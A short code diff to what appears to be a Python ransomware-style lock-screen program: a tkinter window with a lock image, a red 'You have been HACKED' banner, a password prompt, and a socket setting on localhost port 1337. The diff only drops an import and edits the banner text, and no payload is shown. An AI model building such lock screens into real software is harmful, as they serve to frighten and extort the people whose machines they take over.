@@ -7,7 +7,6 @@ import threading
 import select
 import queue
 import sys
-from PIL import Image, ImageTk
 
 HOST = '127.0.0.1'
 PORT = 1337
@@ -51,7 +50,7 @@ def gui():
     img = tk.PhotoImage(file="lock.png")   
 
     canvas.create_image(0, 10, anchor=tk.NW, image=img) 
-    label_pass = tk.Label(master=window, bg="red", text="You have been HACKED!!!")
+    label_pass = tk.Label(master=window, bg="red", text="You have been HACKED!!1!!")
     label_pass.pack()
 
     label_pass = tk.Label(master=window, bg="red", text="Password:")
